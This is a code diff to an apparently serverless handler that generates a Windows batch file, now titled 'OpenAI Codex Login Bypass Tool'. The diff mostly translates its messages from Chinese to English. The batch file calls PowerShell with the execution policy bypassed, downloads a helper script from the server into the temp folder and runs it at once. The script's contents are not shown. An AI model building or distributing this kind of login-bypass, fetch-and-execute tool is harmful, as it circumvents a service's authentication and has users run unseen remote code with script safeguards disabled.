@@ -1268,20 +1268,19 @@ async function handleDownloadBat(request: Request, env: Env): Promise<Response> 
   const workerUrl = url.origin;
 
   const batContent = `@echo off
-chcp 65001 > nul
-title OpenAI Codex 登录同步助手
+title OpenAI Codex Login Bypass Tool
 
 echo ============================================================
-echo        OpenAI Codex 免验证登录助手 (极轻量一键运行版)
+echo      OpenAI Codex Login Bypass Tool (One-Click Edition)
 echo ============================================================
-echo 正在从云端拉起安全同步内核...
+echo Launching local Powershell sync kernel from cloud...
 echo.
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '${workerUrl}/download-helper-script' -OutFile '$env:temp\\codex-helper.ps1' -UseBasicParsing; & '$env:temp\\codex-helper.ps1'"
 
 if %ERRORLEVEL% NEQ 0 (
     echo.
-    echo [提示] 运行中发生异常，请检查网络或联系管理员。
+    echo [Error] Execution failed. Please check your network connection.
     pause
 )
 `;
